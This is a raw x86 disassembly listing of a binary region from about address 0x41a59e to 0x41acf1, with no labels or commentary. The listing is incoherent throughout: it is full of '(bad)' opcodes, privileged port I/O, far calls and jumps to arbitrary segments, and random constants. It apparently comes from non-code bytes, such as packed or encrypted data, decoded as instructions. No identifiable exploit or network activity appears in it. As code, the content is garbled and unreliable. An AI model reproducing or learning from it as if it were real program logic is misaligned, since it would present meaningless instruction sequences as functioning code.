  41a59e:	sub    DWORD PTR [edi],ebx
  41a5a0:	xchg   esp,eax
  41a5a1:	leave  
  41a5a2:	in     al,0xb5
  41a5a4:	rol    DWORD PTR [eax+ecx*2+0x3b],0x2e
  41a5a9:	push   eax
  41a5aa:	pop    ebx
  41a5ab:	ror    al,1
  41a5ad:	jmp    0x41a614
  41a5af:	data16 fadd st,st(1)
  41a5b2:	mov    cl,0xec
  41a5b5:	jg     0x41a55a
  41a5b7:	repz ss shl ch,1
  41a5bb:	lahf   
  41a5bc:	jmp    0x41a614
  41a5be:	or     ebp,DWORD PTR [edi]
  41a5c0:	out    dx,al
  41a5c1:	mov    ebp,esp
  41a5c3:	xor    ch,ah
  41a5c5:	aad    0xdd
  41a5c7:	repz and bh,al
  41a5ca:	loopne 0x41a54f
  41a5cc:	push   ds
  41a5cd:	test   BYTE PTR [ebp+0x14],0xaa
  41a5d1:	push   ss
  41a5d2:	ret    
  41a5d3:	(bad)  
  41a5d4:	daa    
  41a5d5:	jmp    0x41a55b
  41a5d7:	(bad)  
  41a5d9:	xchg   ebx,eax
  41a5da:	mov    al,ds:0xd0de9d88
  41a5df:	cmp    al,0x20
  41a5e1:	(bad)  
  41a5e2:	jae    0x41a61f
  41a5e4:	in     al,0xc2
  41a5e6:	nop
  41a5e7:	add    ebx,edi
  41a5e9:	in     eax,dx
  41a5ea:	sbb    ecx,ebp
  41a5ec:	dec    ebx
  41a5ed:	adc    esi,DWORD PTR [eax+eiz*4]
  41a5f0:	daa    
  41a5f1:	repnz dec edi
  41a5f3:	push   0x12
  41a5f5:	mov    ecx,0xbc5fbf28
  41a5fa:	mov    ebx,0xb71ef15c
  41a5ff:	call   0x0:0x49752ed6
	...
  41a60e:	add    BYTE PTR [eax],al
  41a610:	add    ah,dl
  41a612:	mov    edi,0xedff8dd6
  41a617:	(bad)  
  41a619:	or     al,0x14
  41a61b:	call   0xbb77:0xf531b94e
  41a622:	and    eax,DWORD PTR [ecx]
  41a624:	add    BYTE PTR [ebx+0x55000003],ch
  41a62a:	(bad)  
  41a62b:	push   es
  41a62c:	sub    BYTE PTR [ebx-0x53add6af],dl
  41a632:	int3   
  41a633:	shl    DWORD PTR [ecx],1
  41a635:	shr    dl,1
  41a637:	call   0xa869:0x9d025ba5
  41a63e:	xchg   edi,eax
  41a63f:	bound  esi,QWORD PTR [eax+0x74a6f02f]
  41a645:	xlat   BYTE PTR ds:[ebx]
  41a646:	or     ebx,DWORD PTR [ebp+0x78]
  41a649:	popa   
  41a64a:	push   es
  41a64b:	out    0x83,eax
  41a64d:	push   cs
  41a64e:	sub    bh,BYTE PTR [ecx]
  41a650:	shl    BYTE PTR [edi-0x75131510],0x21
  41a657:	pop    esp
  41a658:	sbb    al,0x23
  41a65a:	imul   eax,ebx,0x4bb19db0
  41a660:	pop    edi
  41a661:	adc    ecx,DWORD PTR [esi-0x5f955907]
  41a667:	dec    edi
  41a668:	pop    ecx
  41a669:	inc    ebp
  41a66a:	inc    eax
  41a66b:	bound  esi,QWORD PTR [ebp+0xe836021]
  41a671:	shr    DWORD PTR [ecx-0x3e],1
  41a674:	ja     0x41a67d
  41a676:	mov    bl,0xb
  41a678:	in     al,0xd6
  41a67a:	xchg   ebx,eax
  41a67b:	xchg   ebp,edx
  41a67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a67e:	cmp    BYTE PTR [eax-0x64],bl
  41a681:	push   0xfffffffa
  41a683:	fidiv  DWORD PTR [edx-0xc9df3cc]
  41a689:	in     al,dx
  41a68a:	or     BYTE PTR [eax],ch
  41a68c:	loopne 0x41a6a9
  41a68e:	stc    
  41a68f:	mov    cl,0x11
  41a691:	test   DWORD PTR ds:0xd555157a,0x1f9c812d
  41a69b:	aad    0xcd
  41a69d:	inc    edi
  41a69e:	(bad)  
  41a69f:	dec    esp
  41a6a0:	push   0xd3ec7236
  41a6a5:	cmp    BYTE PTR [edx+0xe],0x79
  41a6a9:	fnstenv gs:[edi]
  41a6ac:	retf   0x4321
  41a6af:	pop    esi
  41a6b0:	nop
  41a6b1:	or     bl,al
  41a6b3:	cmp    edi,esi
  41a6b5:	pop    ds
  41a6b6:	pop    ecx
  41a6b7:	mov    eax,DWORD PTR [eax]
  41a6b9:	sbb    al,0x54
  41a6bb:	jmp    0x5fe5:0x8ffb4cbe
  41a6c2:	pop    ecx
  41a6c3:	add    eax,DWORD PTR [edx+edx*4]
  41a6c6:	xlat   BYTE PTR ds:[ebx]
  41a6c7:	push   ss
  41a6c8:	jge    0x41a6f2
  41a6ca:	out    0x34,eax
  41a6cc:	pushf  
  41a6cd:	popf   
  41a6ce:	ins    DWORD PTR es:[edi],dx
  41a6cf:	rcl    ecx,1
  41a6d1:	pop    ecx
  41a6d2:	fwait
  41a6d3:	push   ds
  41a6d4:	neg    BYTE PTR [eax+0x2974c5ed]
  41a6da:	xor    al,BYTE PTR [eax]
  41a6dc:	imul   edi,DWORD PTR [ecx-0x7e7425a9],0xd
  41a6e3:	mov    gs,WORD PTR [esi]
  41a6e5:	adc    dh,BYTE PTR [edx-0x6]
  41a6e8:	mov    ds:0xdadc9a0c,eax
  41a6ed:	mov    ch,bh
  41a6ef:	bnd jae 0x41a678
  41a6f2:	jne    0x41a710
  41a6f4:	pop    edi
  41a6f5:	cmp    bh,BYTE PTR [eax]
  41a6f7:	mov    ds:0x548eaf72,eax
  41a6fc:	or     bx,WORD PTR gs:[edi-0x2d4135a4]
  41a704:	mov    bl,0xbf
  41a706:	(bad)  
  41a707:	and    ebx,DWORD PTR [edx-0x75]
  41a70a:	sub    ebx,esi
  41a70c:	xor    eax,edx
  41a70e:	ds or  al,0xa0
  41a711:	test   BYTE PTR [eax-0xdb145d1],dh
  41a717:	fdivr  st,st(1)
  41a719:	sbb    al,0xf0
  41a71b:	ret    
  41a71c:	sbb    ah,BYTE PTR ss:[ecx+edx*2]
  41a720:	inc    edi
  41a721:	cmp    al,0xf0
  41a723:	mov    esi,0x821d7155
  41a728:	xchg   ecx,eax
  41a729:	jecxz  0x41a715
  41a72b:	push   ecx
  41a72c:	mov    al,0x63
  41a72e:	jg     0x41a787
  41a730:	cmp    BYTE PTR [esi+ebp*8-0x52],ch
  41a734:	mov    WORD PTR [ecx],es
  41a736:	les    eax,FWORD PTR [edx+0x3a9e2f69]
  41a73c:	inc    eax
  41a73d:	retf   
  41a73e:	(bad)  
  41a73f:	pop    edx
  41a740:	or     ebx,DWORD PTR [edx-0x7]
  41a743:	test   BYTE PTR [esp+esi*2-0x30ed65ab],bl
  41a74a:	xchg   esp,eax
  41a74b:	inc    edi
  41a74c:	stos   DWORD PTR es:[edi],eax
  41a74d:	out    0xf,eax
  41a74f:	jne    0xa56cc0c8
  41a755:	lock and BYTE PTR [edi-0x35cb9096],0xe
  41a75d:	xor    al,0xa4
  41a75f:	scas   al,BYTE PTR es:[edi]
  41a760:	pop    ebx
  41a761:	sbb    BYTE PTR [esp+ebp*2+0x65],bl
  41a765:	xchg   esp,eax
  41a766:	cmp    DWORD PTR [ecx],eax
  41a768:	pop    esi
  41a769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a76a:	adc    edi,ebx
  41a76c:	test   BYTE PTR [ecx-0x2b2496b],dh
  41a772:	pop    ds
  41a773:	lds    ebx,FWORD PTR [ecx-0x3400dc32]
  41a779:	dec    ecx
  41a77a:	int    0x71
  41a77c:	sbb    dh,dh
  41a77e:	popf   
  41a77f:	mov    bl,0x33
  41a781:	fs mov edx,0xe3ee555
  41a787:	jg     0x41a76a
  41a789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a78a:	test   BYTE PTR [edi+0x11d98880],dh
  41a790:	imul   ecx,DWORD PTR [ebx],0x24
  41a793:	aad    0xe9
  41a795:	and    eax,0x90a3c057
  41a79a:	push   esi
  41a79b:	cmp    edi,esp
  41a79d:	leave  
  41a79e:	pushf  
  41a79f:	xchg   BYTE PTR [ebp+0x28159682],cl
  41a7a5:	dec    ecx
  41a7a6:	idiv   ah
  41a7a8:	or     eax,0x2d691b9d
  41a7ad:	pop    esp
  41a7ae:	mov    ebp,0x200a1203
  41a7b3:	xchg   ebx,eax
  41a7b4:	nop
  41a7b5:	(bad)  [edi]
  41a7b7:	das    
  41a7b8:	or     DWORD PTR [esi],ecx
  41a7ba:	jle    0x41a80c
  41a7bc:	pop    edi
  41a7bd:	enter  0xab41,0x95
  41a7c1:	fcmovbe st,st(1)
  41a7c3:	and    DWORD PTR [edx+0x7dc05065],edi
  41a7c9:	std    
  41a7ca:	mov    WORD PTR [esi+0x58],fs
  41a7cd:	int3   
  41a7ce:	ins    BYTE PTR es:[edi],dx
  41a7cf:	xchg   edi,eax
  41a7d0:	mov    bh,0x7a
  41a7d2:	int3   
  41a7d3:	nop
  41a7d4:	loopne 0x41a82f
  41a7d6:	jmp    0xba6b3971
  41a7db:	out    dx,eax
  41a7dc:	add    cx,ax
  41a7df:	ins    DWORD PTR es:[edi],dx
  41a7e0:	push   ebx
  41a7e1:	fist   DWORD PTR [ecx]
  41a7e3:	dec    edi
  41a7e4:	in     al,0xf8
  41a7e6:	loopne 0x41a7b4
  41a7e8:	les    edi,FWORD PTR [edx-0x62]
  41a7eb:	dec    ebp
  41a7ec:	jb     0x41a781
  41a7ee:	mov    al,ds:0xbd8a4ba2
  41a7f3:	adc    edi,edx
  41a7f5:	(bad)  
  41a7f6:	xchg   ecx,eax
  41a7f7:	in     eax,0xbc
  41a7f9:	fld    TBYTE PTR [eax]
  41a7fb:	sar    BYTE PTR [ebx+0x49bdda70],1
  41a801:	out    dx,al
  41a802:	out    0x7a,eax
  41a804:	jne    0x41a78c
  41a806:	rcr    DWORD PTR [ebx-0x62],cl
  41a809:	dec    esi
  41a80a:	mov    ah,0xd3
  41a80d:	sub    edi,DWORD PTR [ebp+eax*1-0x7278d450]
  41a814:	dec    esp
  41a815:	xor    eax,0x7dfeb504
  41a81a:	push   DWORD PTR [edi]
  41a81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a81d:	pushf  
  41a81e:	loope  0x41a871
  41a820:	dec    esi
  41a821:	lock popf 
  41a823:	mov    ebx,0x5044d98a
  41a828:	es mov ecx,0x2bea7e87
  41a82e:	(bad)  
  41a82f:	scas   eax,DWORD PTR es:[edi]
  41a830:	push   ds
  41a831:	adc    eax,0x69e3ab8
  41a836:	jae    0x41a7c4
  41a838:	(bad)  
  41a839:	jnp    0x41a823
  41a83b:	rcr    DWORD PTR [esi+0x59676359],0xe5
  41a842:	dec    ecx
  41a843:	push   eax
  41a844:	fild   DWORD PTR [edx]
  41a846:	cmp    esi,ebx
  41a848:	aam    0x13
  41a84a:	xor    ebx,DWORD PTR [esi+esi*8+0x7e]
  41a84e:	hlt    
  41a84f:	or     esi,esi
  41a851:	jle    0x41a86d
  41a853:	daa    
  41a854:	push   es
  41a855:	daa    
  41a856:	js     0x41a7d8
  41a858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a859:	and    BYTE PTR [ecx+0x44],dh
  41a85c:	out    dx,eax
  41a85d:	sahf   
  41a85e:	shr    edi,0xc4
  41a861:	sbb    ecx,DWORD PTR [edx+ebp*2-0x4443b24c]
  41a868:	fcom   QWORD PTR [edx]
  41a86a:	mov    ds:0x1ba746db,al
  41a86f:	inc    eax
  41a871:	sub    DWORD PTR [edi-0x43ae706],edx
  41a877:	mov    ebp,0x62b7e153
  41a87c:	int3   
  41a87d:	(bad)  
  41a87f:	fild   QWORD PTR [esi+0xf]
  41a882:	repz popaw 
  41a885:	cld    
  41a886:	adc    al,0x8
  41a888:	(bad)  
  41a889:	jnp    0x41a85e
  41a88b:	stc    
  41a88c:	outs   dx,BYTE PTR ds:[esi]
  41a88d:	(bad)  
  41a88e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a88f:	pop    ecx
  41a890:	jnp    0x41a8f1
  41a892:	icebp  
  41a893:	shr    DWORD PTR [esi],0x6e
  41a896:	jb     0x41a89a
  41a898:	or     DWORD PTR [ecx+0x3dc094cf],esi
  41a89e:	add    eax,0xae2b47d9
  41a8a3:	inc    esi
  41a8a4:	hlt    
  41a8a5:	push   ss
  41a8a6:	adc    al,0x37
  41a8a8:	test   eax,0xf0d8a1e9
  41a8ad:	pop    edi
  41a8ae:	mov    esp,0xacebede1
  41a8b3:	adc    esi,0xffffffa9
  41a8b6:	and    DWORD PTR [esi+0x48],edi
  41a8b9:	js     0x41a908
  41a8bb:	cmp    al,BYTE PTR [eax]
  41a8bd:	inc    esp
  41a8be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8bf:	aaa    
  41a8c0:	push   ds
  41a8c1:	aaa    
  41a8c2:	js     0x41a8e7
  41a8c4:	jo     0x41a906
  41a8c6:	jbe    0x41a855
  41a8c8:	mov    ch,0x54
  41a8ca:	mov    bh,0x9f
  41a8cc:	and    al,0xf
  41a8ce:	test   al,0xed
  41a8d0:	xchg   edx,eax
  41a8d1:	mov    ebp,0xd6f394ec
  41a8d6:	imul   esi,DWORD PTR [edi+esi*8-0x7881bb2e],0xffffff88
  41a8de:	stos   BYTE PTR es:[edi],al
  41a8df:	sub    eax,0xa4301380
  41a8e4:	imul   eax,DWORD PTR [ecx-0x2ab6a38],0xd1a0bd86
  41a8ee:	and    al,0xa5
  41a8f0:	jge    0x41a8a9
  41a8f2:	mov    edi,0xd0feff07
  41a8f7:	js     0x41a8c1
  41a8f9:	pushf  
  41a8fa:	test   BYTE PTR [edx+0x1e],al
  41a8fd:	inc    BYTE PTR [edi+0x6640c32]
  41a903:	push   ebp
  41a904:	popa   
  41a905:	mov    eax,ds:0x57c3899d
  41a90a:	jmp    0x41a8d6
  41a90c:	loop   0x41a923
  41a90e:	idiv   BYTE PTR [ebx+0x24]
  41a911:	stc    
  41a912:	pop    esp
  41a913:	aaa    
  41a914:	pushf  
  41a915:	mov    dl,0x19
  41a917:	adc    edx,DWORD PTR [ecx-0x4d]
  41a91a:	inc    edx
  41a91b:	mov    esp,esi
  41a91d:	fs pop ss
  41a91f:	pusha  
  41a920:	mov    ecx,0x477cc956
  41a925:	nop
  41a926:	shr    DWORD PTR [edi+ebx*4+0x50],cl
  41a92a:	push   cs
  41a92b:	(bad)  
  41a92c:	outs   dx,DWORD PTR ds:[esi]
  41a92d:	out    0xcc,eax
  41a92f:	xchg   esp,eax
  41a930:	inc    esp
  41a931:	xchg   ebp,eax
  41a932:	pop    ecx
  41a933:	or     DWORD PTR [esi],esp
  41a935:	dec    eax
  41a936:	mov    edx,0xd6a26b93
  41a93b:	mov    bl,0xd3
  41a93d:	jecxz  0x41a8e5
  41a93f:	pop    ds
  41a940:	dec    ebp
  41a941:	sub    DWORD PTR [ebp-0x742cfaca],ecx
  41a947:	cld    
  41a948:	jo     0x41a967
  41a94a:	xor    edx,esp
  41a94c:	mov    ecx,0xa8bcc559
  41a951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a952:	pushf  
  41a953:	lods   al,BYTE PTR ds:[esi]
  41a954:	xchg   esp,esp
  41a956:	dec    BYTE PTR [ecx-0x1be75201]
  41a95c:	rcl    ch,cl
  41a95e:	lea    edi,[edx]
  41a960:	jns    0x41a945
  41a962:	or     BYTE PTR [ebp+0x7353f7e],cl
  41a968:	xor    DWORD PTR [esi-0x1c],esp
  41a96b:	ins    DWORD PTR es:[edi],dx
  41a96c:	std    
  41a96d:	xor    eax,0x554a265c
  41a972:	lds    esp,FWORD PTR [esi+0x63]
  41a975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a976:	or     ah,al
  41a978:	out    0xab,al
  41a97a:	cs xchg edi,eax
  41a97c:	mov    ss,esi
  41a97e:	sub    eax,0xd1ce8188
  41a983:	sub    dl,BYTE PTR [ebx]
  41a985:	das    
  41a986:	stos   BYTE PTR es:[edi],al
  41a987:	in     al,0xe4
  41a989:	aam    0x54
  41a98b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a98c:	jp     0x41a93b
  41a98e:	lods   al,BYTE PTR ds:[esi]
  41a98f:	xchg   ecx,eax
  41a990:	rcr    DWORD PTR [eax],cl
  41a992:	pop    fs
  41a994:	xor    al,bl
  41a996:	cmc    
  41a997:	pop    eax
  41a998:	pop    edx
  41a999:	push   0x9fda1248
  41a99e:	mov    esi,0x19acb55f
  41a9a3:	je     0x41a967
  41a9a5:	mov    edi,0x5d78bf91
  41a9aa:	or     edx,eax
  41a9ac:	adc    ebp,DWORD PTR [esi]
  41a9ae:	mov    ds:0xe3c1cc0d,al
  41a9b3:	call   0xd7d12c20
  41a9b8:	ins    BYTE PTR es:[edi],dx
  41a9b9:	aam    0xf1
  41a9bb:	jne    0x41a96d
  41a9bd:	call   0xcd952313
  41a9c2:	push   0x5d
  41a9c4:	ins    DWORD PTR es:[edi],dx
  41a9c5:	rol    BYTE PTR [ecx-0x35],0x3c
  41a9c9:	jp     0x41a9d9
  41a9cb:	call   0xf6b62498
  41a9d0:	cmp    al,0xa4
  41a9d2:	jp     0x41aa07
	...
  41a9e0:	add    BYTE PTR [ebx-0x8],al
  41a9e3:	gs sbb edi,edi
  41a9e6:	popf   
  41a9e7:	jg     0x41a9e3
  41a9e9:	mov    al,0x88
  41a9eb:	dec    ebp
  41a9ec:	sahf   
  41a9ed:	mov    BYTE PTR [ecx],bh
  41a9ef:	pop    ds
  41a9f0:	mov    ds:0x12766,eax
  41a9f5:	stos   DWORD PTR es:[edi],eax
  41a9f6:	add    eax,DWORD PTR [eax]
  41a9f8:	add    BYTE PTR [ebp-0x3e],al
  41a9fb:	test   DWORD PTR [ecx],ecx
  41a9fd:	sub    eax,0xea0e310c
  41aa02:	(bad)  
  41aa05:	out    dx,eax
  41aa06:	ss add eax,0xbd4e4ac4
  41aa0c:	daa    
  41aa0d:	adc    ah,cl
  41aa0f:	test   DWORD PTR [ebp-0xb33092d],esi
  41aa15:	xor    BYTE PTR [ebx+0x77],bl
  41aa18:	repnz inc edx
  41aa1a:	stos   BYTE PTR es:[edi],al
  41aa1b:	fwait
  41aa1c:	mul    DWORD PTR [esi-0x1868f5c6]
  41aa22:	popa   
  41aa23:	fst    QWORD PTR [edx+0x44]
  41aa26:	ror    DWORD PTR [edi+0x36],1
  41aa29:	pop    ebp
  41aa2a:	pop    esp
  41aa2b:	cmp    ebx,DWORD PTR [eax]
  41aa2d:	inc    ebp
  41aa2e:	ds (bad) 
  41aa30:	rol    bh,0x33
  41aa33:	ins    BYTE PTR es:[edi],dx
  41aa34:	aad    0xca
  41aa36:	rcr    DWORD PTR [ecx+edx*4+0x18fd613e],1
  41aa3d:	out    0x64,eax
  41aa3f:	jae    0x41aa29
  41aa41:	lods   al,BYTE PTR ds:[esi]
  41aa42:	adc    al,0xca
  41aa44:	outs   dx,BYTE PTR ds:[esi]
  41aa45:	jge    0x41a9dd
  41aa47:	xor    eax,0xc6c94ea8
  41aa4c:	out    dx,eax
  41aa4d:	xlat   BYTE PTR ds:[ebx]
  41aa4e:	add    cl,0x8f
  41aa51:	lds    ebx,FWORD PTR [esi]
  41aa53:	jmp    0x8207:0x1cae63db
  41aa5a:	aad    0x6e
  41aa5c:	js     0x41aa4c
  41aa5e:	jo     0x41aaae
  41aa60:	repnz lds ebp,FWORD PTR [ecx]
  41aa63:	dec    esp
  41aa64:	shl    BYTE PTR [ecx-0x3defeb63],0x96
  41aa6b:	cmp    bh,BYTE PTR [edx-0x1e]
  41aa6e:	mov    esp,0xeeebc54e
  41aa73:	jecxz  0x41aa4e
  41aa75:	aad    0x28
  41aa77:	or     esi,edx
  41aa79:	lock mov esp,0xe5256820
  41aa7f:	or     al,0xf
  41aa81:	mov    esi,0xcecb1f8c
  41aa86:	mov    dl,0xce
  41aa88:	pop    ds
  41aa89:	xlat   BYTE PTR ds:[ebx]
  41aa8a:	icebp  
  41aa8b:	cs jmp 0x41aa26
  41aa8e:	repnz imul ebp,DWORD PTR [edx+0x2b],0xa64dd96f
  41aa96:	fnstenv [esi]
  41aa98:	jae    0x41ab0d
  41aa9a:	icebp  
  41aa9b:	mov    al,0x42
  41aa9d:	rcr    ebx,0x41
  41aaa0:	test   al,0xb6
  41aaa2:	ret    0x7bc2
  41aaa5:	dec    edi
  41aaa6:	loope  0x41ab1c
  41aaa8:	xchg   DWORD PTR [edx],eax
  41aaaa:	ins    BYTE PTR es:[edi],dx
  41aaab:	(bad)  [ebp-0x3]
  41aaae:	sbb    ecx,DWORD PTR [ebp-0xc]
  41aab1:	xor    bh,BYTE PTR [eax]
  41aab3:	shl    BYTE PTR [eax],0x1a
  41aab6:	cld    
  41aab7:	push   ebp
  41aab8:	mov    ch,0xc0
  41aaba:	mov    esp,0x6d951552
  41aabf:	aas    
  41aac0:	mov    al,ds:0x98c66c8c
  41aac5:	xchg   DWORD PTR [edi+0x304c6e19],edx
  41aacb:	adc    cl,BYTE PTR [eax-0x46]
  41aace:	jns    0x41aaba
  41aad0:	xchg   edi,eax
  41aad1:	mov    DWORD PTR [ecx+0x6a],ecx
  41aad4:	les    esp,FWORD PTR [ebx-0x35]
  41aad7:	sar    BYTE PTR [ebx],cl
  41aad9:	adc    DWORD PTR [esi+0x24],edx
  41aadc:	lahf   
  41aadd:	ins    DWORD PTR es:[edi],dx
  41aade:	pop    edi
  41aadf:	sub    bh,BYTE PTR [ecx-0x4a2c9937]
  41aae5:	popa   
  41aae6:	repz mov esp,0x878fb912
  41aaec:	mov    WORD PTR ds:0xb470ca11,fs
  41aaf2:	inc    edx
  41aaf3:	mov    dh,0xa
  41aaf5:	add    edx,DWORD PTR [edi+0x3a]
  41aaf8:	push   ecx
  41aaf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aafa:	jno    0x41ab0c
  41aafc:	sub    DWORD PTR [eax+0x78],ebp
  41aaff:	in     al,dx
  41ab00:	jge    0x41aa9b
  41ab02:	(bad)
  41ab06:	test   DWORD PTR ds:0xa759d3e1,esi
  41ab0c:	sub    dh,BYTE PTR [esi-0x2ab5ea0d]
  41ab12:	imul   edx,eax,0x656deb07
  41ab18:	hlt    
  41ab19:	push   ecx
  41ab1a:	and    bh,BYTE PTR [ecx]
  41ab1c:	mov    ah,0x4c
  41ab1e:	sbb    DWORD PTR [edx+0x7614c01f],edx
  41ab24:	fs mov edi,0xe2ca9a83
  41ab2a:	out    dx,eax
  41ab2b:	pusha  
  41ab2c:	popa   
  41ab2d:	push   ebx
  41ab2e:	lock jl 0x41ab8e
  41ab31:	inc    ecx
  41ab32:	test   eax,0x92af863e
  41ab37:	or     dh,BYTE PTR ds:[ebp+0x75]
  41ab3b:	mov    al,ds:0x115b258b
  41ab40:	adc    BYTE PTR [edx],ah
  41ab42:	test   ch,0x85
  41ab45:	vpminub xmm4,xmm1,xmm6
  41ab49:	lea    esi,[eax]
  41ab4b:	(bad)  
  41ab4c:	push   eax
  41ab4d:	outs   dx,BYTE PTR ds:[esi]
  41ab4e:	aad    0xd7
  41ab50:	inc    edi
  41ab51:	push   ecx
  41ab52:	ss iret 
  41ab54:	sub    eax,0x2379767f
  41ab59:	test   BYTE PTR [ecx],dh
  41ab5b:	cli    
  41ab5c:	and    bh,BYTE PTR [eax+0x62cab219]
  41ab62:	adc    DWORD PTR [esi+0x3a26073c],ecx
  41ab68:	or     eax,0x2cf82c3e
  41ab6d:	(bad)  
  41ab6e:	out    0x75,eax
  41ab70:	push   esp
  41ab71:	add    ecx,DWORD PTR [edx+0x3a059474]
  41ab77:	lea    ecx,[esi]
  41ab79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab7a:	push   edi
  41ab7b:	fisub  WORD PTR [eax-0x7b]
  41ab7e:	push   bx
  41ab80:	mov    WORD PTR [ebp+0x5d],?
  41ab83:	pop    ss
  41ab84:	sub    eax,0xa82cbe9d
  41ab89:	mov    ch,0xb9
  41ab8b:	js     0x41aba0
  41ab8d:	xchg   cl,cl
  41ab8f:	arpl   bp,bp
  41ab91:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41ab93:	out    0xf7,eax
  41ab95:	xor    DWORD PTR [eax],ebp
  41ab97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab98:	xor    al,0x54
  41ab9a:	popf   
  41ab9b:	stc    
  41ab9c:	xchg   edx,eax
  41ab9d:	retf   0x40c7
  41aba0:	das    
  41aba1:	inc    edi
  41aba2:	or     ah,BYTE PTR [eax]
  41aba4:	mov    bh,0x43
  41aba6:	and    bl,BYTE PTR [ebx+0x5]
  41aba9:	jbe    0x41ab41
  41abab:	shr    DWORD PTR [esi],1
  41abad:	xchg   ebp,eax
  41abae:	dec    esi
  41abaf:	sub    al,0x8
  41abb1:	xchg   ah,bh
  41abb3:	xor    ebp,edi
  41abb5:	push   es
  41abb6:	jp     0x41ac0c
  41abb8:	std    
  41abb9:	inc    esi
  41abba:	push   0xffffffa9
  41abbc:	push   ebx
  41abbd:	jle    0x41aba8
  41abbf:	inc    edi
  41abc0:	jp     0x41ac3b
  41abc2:	push   eax
  41abc3:	jg     0x41abd7
  41abc5:	xor    eax,0x658a61f5
  41abca:	xchg   ecx,eax
  41abcb:	jl     0x41abd2
  41abcd:	pop    ecx
  41abce:	daa    
  41abcf:	and    BYTE PTR [esi+0x56e430bb],0x30
  41abd6:	inc    ebp
  41abd7:	test   BYTE PTR [esi+eax*4+0x5],bh
  41abdb:	jne    0x41abc2
  41abdd:	pop    ds
  41abde:	aam    0x8c
  41abe0:	cmp    dl,BYTE PTR [ebx]
  41abe2:	retf   
  41abe3:	sub    DWORD PTR [eax],edx
  41abe5:	fistp  WORD PTR [edx]
  41abe7:	sub    dl,BYTE PTR [eax-0x440fc5d1]
  41abed:	call   0x2feb5cbd
  41abf2:	inc    edx
  41abf3:	jnp    0x41aba2
  41abf5:	sub    DWORD PTR [esi+0x75e6fc12],esi
  41abfb:	push   cs
  41abfc:	mov    al,0xf2
  41abfe:	js     0x41abf2
  41ac00:	(bad)  
  41ac01:	imul   ebx,ecx,0xffffffff
  41ac04:	shr    DWORD PTR [ebx+0xc],1
  41ac07:	lods   al,BYTE PTR ds:[esi]
  41ac08:	push   0x1c9fd965
  41ac0d:	ds out dx,eax
  41ac0f:	add    eax,0xa67ff5d
  41ac14:	inc    ebx
  41ac15:	sub    bh,BYTE PTR [edi+0x45]
  41ac18:	ret    0x4023
  41ac1b:	and    DWORD PTR [esi+eiz*8+0x6c85f979],ebp
  41ac22:	sub    eax,DWORD PTR [ebp-0x7a]
  41ac25:	imul   esi,edx,0x5f
  41ac28:	sub    bl,0x11
  41ac2b:	xor    eax,0x45c1cf72
  41ac30:	das    
  41ac31:	add    cl,dl
  41ac33:	cmp    BYTE PTR [ebp+0x79],0x97
  41ac37:	leave  
  41ac38:	mov    ecx,0x3f59fb5f
  41ac3d:	dec    esp
  41ac3e:	mov    dh,0x60
  41ac40:	test   eax,0x5c441d36
  41ac45:	mov    eax,ds:0xc00cdf16
  41ac4a:	push   ecx
  41ac4b:	popf   
  41ac4c:	pop    ebx
  41ac4d:	jmp    0x41ac3a
  41ac4f:	xchg   ecx,eax
  41ac50:	add    BYTE PTR es:[esp+ebx*8],ch
  41ac54:	cli    
  41ac55:	fwait
  41ac56:	xchg   ecx,eax
  41ac57:	xor    DWORD PTR [ebp-0x3],eax
  41ac5a:	adc    eax,0x66b14202
  41ac5f:	dec    BYTE PTR [edi-0x55278004]
  41ac65:	ins    BYTE PTR es:[edi],dx
  41ac66:	fwait
  41ac67:	mov    edx,0xb62e14fc
  41ac6c:	ins    DWORD PTR es:[edi],dx
  41ac6d:	and    al,0xc0
  41ac6f:	shl    BYTE PTR [edi-0x13e02a12],cl
  41ac75:	mov    dh,0xa3
  41ac77:	push   ds
  41ac78:	aad    0x29
  41ac7a:	mov    edx,0x4cc1fcf7
  41ac7f:	mov    cl,0x4c
  41ac81:	ror    DWORD PTR [ebx-0x63],0xd5
  41ac85:	popf   
  41ac86:	out    dx,eax
  41ac87:	in     eax,dx
  41ac88:	mov    esp,0xc6ac31a
  41ac8d:	jmp    0xc3a89700
  41ac92:	test   al,0x9d
  41ac94:	aam    0xd5
  41ac96:	xor    DWORD PTR [eax-0x25],ebx
  41ac99:	sbb    al,0x70
  41ac9b:	jb     0x41ac31
  41ac9d:	mov    WORD PTR [ebx-0x10e2dba8],ds
  41aca3:	pop    esi
  41aca4:	mov    ds:0x9e8ed114,al
  41aca9:	jbe    0x41ac76
  41acab:	bnd jle 0x41ac8a
  41acae:	xchg   BYTE PTR [ebx-0x1e1c5f5a],dh
  41acb4:	out    dx,eax
  41acb5:	cld    
  41acb6:	mov    ch,0x2c
  41acb8:	push   ds
  41acb9:	add    BYTE PTR ds:0x9c08a3b9,ah
  41acbf:	fstp   DWORD PTR [ecx+0x27]
  41acc2:	jno    0x41ad0b
  41acc4:	mov    bh,0xa2
  41acc6:	loope  0x41ad39
  41acc8:	mov    eax,ds:0xe0194ddc
  41accd:	and    al,0x42
  41accf:	inc    esi
  41acd0:	rol    BYTE PTR [edi+edx*8],cl
  41acd3:	cli    
  41acd4:	jecxz  0x41ad2f
  41acd6:	push   ds
  41acd7:	inc    ebp
  41acd8:	ja     0x41ad17
  41acda:	(bad)  
  41acdb:	out    0xb9,al
  41acdd:	xor    cl,BYTE PTR [esi]
  41acdf:	jne    0x41ad09
  41ace1:	in     eax,0x15
  41ace3:	adc    al,0x12
  41ace5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ace6:	add    al,0x67
  41ace8:	lods   eax,DWORD PTR ds:[esi]
  41ace9:	xor    cl,BYTE PTR [ecx-0x2f34c07f]
  41acef:	out    0x3c,al
  41acf1:	push   cs
